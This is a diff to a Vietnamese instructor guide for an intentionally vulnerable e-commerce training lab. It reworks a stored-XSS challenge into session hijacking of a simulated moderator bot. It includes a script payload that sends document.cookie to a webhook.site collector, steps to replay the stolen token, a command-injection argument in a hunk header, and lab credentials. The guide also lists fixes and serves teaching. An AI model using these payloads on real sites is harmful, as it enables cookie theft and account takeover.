@@ -13,7 +13,7 @@
 | Mongo | users / orders (internal) |
 | MySQL | products / reviews / **shopusers** mirror MD5 (internal) |
 | flag-service | Go :8080 internal — /health /info /metrics **/flag** |
-| xss-bot | Playwright, login admin, visit `/admin/reviews` mỗi 30s — nằm trên edge network, CÓ Internet egress (để exfil webhook) |
+| xss-bot | Playwright, login **moderator@** (role moderator), visit `/admin/reviews` mỗi 30s — edge network, CÓ Internet egress (để exfil webhook) |
 
 **Trang `/objectives` (student-facing):** danh sách 16 mục tiêu viết trung tính (chỉ mô tả kết quả, không nói kỹ thuật) + form nộp evidence token. Nộp đúng `FLAG{cN}` → hiện card "✓ OBJECTIVE COMPLETED" với checklist "You demonstrated..." + tên kỹ thuật + gợi ý bước tiếp theo ghi journal. Song ngữ theo cookie `lang` (mặc định vi). Chỉ validate, không lưu trạng thái — học viên tự tích bảng checklist in từ bài học.
 
@@ -21,6 +21,7 @@
 |-------|----------|------|---------|
 | admin@cybershop.vn | Admin#1337 | admin | secretNote = c2; apiKey sk_live_admin_9f3ac21e77 |
 | demo@cybershop.vn | demo123 | customer | OTP = 1337 (in công khai trên trang login) |
+| moderator@cybershop.vn | ModBot#2024 | **moderator** | account của xss-bot — mục tiêu session hijacking C14; vào được /admin/reviews |
 | john@cybershop.vn | jordan23 | customer | **rockyou ✓** — order #1001 |
 | bob@cybershop.vn | monkey | customer | **rockyou top-20** — order #1042 chứa c7 |
 
@@ -204,26 +205,29 @@ curl -H "Cookie: <admin-token>" --data-urlencode 'target=x; cat /opt/scripts/net
 - *Bản chất:* bio profile render raw (`<%- profile.bio %>`) nhưng **chỉ chủ tài khoản nhìn thấy** → payload chỉ XSS chính mình.
 - *Điểm dạy:* phân biệt self vs stored vs reflected; self-XSS riêng rẻ impact ~0, nguy hiểm khi chain với CSRF/login-CSRF lỡ nạn nhân dán payload vào phiên của họ.
 
-**Stored XSS (C14)**
-- *Bản chất:* review lưu DB nguyên văn, render raw ở `/product/:id` VÀ `/admin/reviews` — trang mà **xss-bot (admin giả lập)** visit mỗi 30s. Nạn nhân là admin, không phải bạn. Cookie `token` là HttpOnly (không đọc được bằng `document.cookie`) NHƯNG server set kèm cookie **`moderation_key=FLAG{c14}` không HttpOnly khi admin login** ("legacy console cache") → cookie-theft có đồ mà lấy.
+**Stored XSS + Session Hijacking (C14)**
+- *Bản chất:* review lưu DB nguyên văn, render raw ở `/product/:id` VÀ `/admin/reviews` — trang mà **xss-bot login bằng account `moderator@cybershop.vn` (role `moderator`)** visit mỗi 30s. Nạn nhân là bot, không phải bạn.
+- *Điểm mấu chốt về cookie flag:* session `token` của **admin** là HttpOnly (XSS đọc không được — dạy hardened), nhưng session của **moderator** set KHÔNG HttpOnly ("legacy console cần JS đọc được") → đánh cắp được nguyên con token. Kèm `moderation_key=FLAG{c14}` cũng non-HttpOnly.
 - *Sơ đồ flow:*
   ```
-  Học viên trồng <script> vào REVIEW SẢN PHẨM (/product/<id>/review)
-        ↓ lưu RAW vào MySQL (không sanitize)
-  BOT ADMIN login + vào /admin/reviews mỗi 30s (bot có Internet egress)
-        ↓ script CHẠY TRONG BROWSER CỦA ADMIN — attacker ≠ victim
-  document.cookie chứa moderation_key=FLAG{c14} (token thì HttpOnly!)
+  Học viên trồng <script> vào REVIEW SẢN PHẨM (/product/<id>/review — SP nào cũng được,
+        bot đọc bảng reviews toàn bộ, không lọc product)
+        ↓
+  BOT MODERATOR login + vào /admin/reviews mỗi 30s (có Internet egress)
+        ↓ script chạy trong browser CỦA BOT — attacker ≠ victim
+  document.cookie = token(non-HttpOnly!) + moderation_key=FLAG{c14} + shop_state
         ↓ exfil về COLLECTOR CỦA HỌC VIÊN (webhook.site/...)
-  Học viên mở inbox webhook của mình → nhận cookie + flag
+  HỌC VIÊN REPLAY token stolen vào browser mình → đăng nhập THÀNH Mod Bot
+        → /admin/reviews hiện dữ liệu kiểm duyệt = SESSION HIJACKING hoàn chỉnh
   ```
-- *Phát hiện:* form review không sanitize (thử `<b>test</b>` in đậm thật); missions hint nhắc bot đọc review định kỳ; decode cookie của chính mình sau khi login admin thấy `moderation_key`.
-- *Payload mẫu (đã verify cơ chế — thay UUID webhook của học viên):*
+- *Phát hiện:* form review không sanitize; decode cookie của chính mình sau khi login các role thấy khác biệt HttpOnly; robots.txt lộ /admin.
+- *Payload mẫu (thay UUID webhook của học viên):*
   ```html
-  <script>new Image().src="https://webhook.site/<uuid>?c="+encodeURIComponent(document.cookie)</script>
+  <script>new Image().src="https://webhook.site/<uuid>?who=<tên>&cookie="+encodeURIComponent(document.cookie)</script>
   ```
-  hoặc fetch với encodeURIComponent. → chờ tối đa ~40s (chu kỳ bot 30s + 8s giữ trang) → inbox webhook hiện `moderation_key=FLAG{c14}; shop_state=...`. Lỗi dạy kèm: quên encodeURIComponent mất dấu `&`/`+`; dùng https cho trang https (mixed content chặn http).
-- *Smoke test:* `WITH_BOT=1 ./smoke-test.sh` tự trồng payload exfil về collector local (python http.server trên gateway của mạng edge) và khẳng định cookie chứa moderation_key đến nơi.
-- *Fix đúng:* escape khi render, sanitize-html khi lưu, CSP `script-src 'self'`, HttpOnly cho MỌI cookie nhạy cảm (không chỉ token), SameSite.
+  → chờ tối đa ~50s (chu kỳ 30s + login + load + 8s giữ trang). Replay: DevTools → Application → Cookies → thêm `token=<giá trị stolen>` → refresh → nav thành "Thoát (Mod Bot)".
+- *Smoke test:* `WITH_BOT=1 ./smoke-test.sh` tự trồng payload → collector local nhận cookie → **rút token khỏi log và replay thật** xác nhận hijack thành công (2 check: C14-exfil + C14-hijack).
+- *Fix đúng:* escape khi render, sanitize-html khi lưu, CSP, HttpOnly cho MỌI cookie phiên (xóa "legacy exception"), SameSite, xoá service account dùng chung.
 
 **CSRF (C16)**
 - *Bản chất:* `POST /profile/password` đổi mật khẩu KHÔNG có CSRF token, cookie không SameSite, không check Origin/Referer → site ngoài có thể ép browser nạn nhân (đang đăng nhập) gửi request.
@@ -281,7 +285,7 @@ Chỉ dùng khi học viên đã thử và bế tắc — không nói trước:
 6. *"Có feature server tải URL giúp bạn. Nó đứng ở mạng nào?"*
 7. *"Template string là code. Ai render nó?"*
 8. *"Cookie shop_state: format spec nằm ngay trong source."*
-9. *"Review của bạn được AI... à nhầm, admin bot đọc định kỳ."*
+9. *"Review của bạn được AI... à nhầm, moderator bot đọc định kỳ. Session của nó không HttpOnly đâu."*
 
 ## 6. Phụ lục: Dạy nhận diện mã hóa / hash (kỹ năng nền)
 
